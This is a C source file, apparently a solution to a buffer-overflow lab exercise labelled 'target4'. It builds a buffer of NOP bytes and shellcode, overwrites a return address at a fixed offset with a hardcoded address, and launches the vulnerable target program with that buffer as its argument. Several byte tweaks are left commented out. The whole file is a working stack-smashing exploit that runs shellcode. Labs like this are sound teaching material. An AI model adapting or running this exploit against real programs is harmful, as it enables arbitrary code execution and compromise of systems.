#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define ADDR 0x3021fdf0
#define NOP 0x90
#define BUF_SIZE 189

int main(void) {
    char *args[3];
    char *env[1];
    char *ptr;
    long *addr_ptr;

    char buff[BUF_SIZE];
    int i;
    ptr = buff;
    addr_ptr = (long *) (&buff[184]);

    for (i = 0; i < BUF_SIZE; i++)
        buff[i] = NOP;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

//    buff[168] = '\x93';
    buff[168] = '\0';
//    buff[169] = '\x00';
    // buff[170] = '\x00';
    // buff[171] = '\x00';

    // buff[172] = '\xa9';
    // buff[173] = '\xff';
    // buff[174] = '\xff';
    // buff[175] = '\x1f';

    *(addr_ptr) = ADDR;
    buff[BUF_SIZE - 1] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;

    env[0] = "\x93";

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
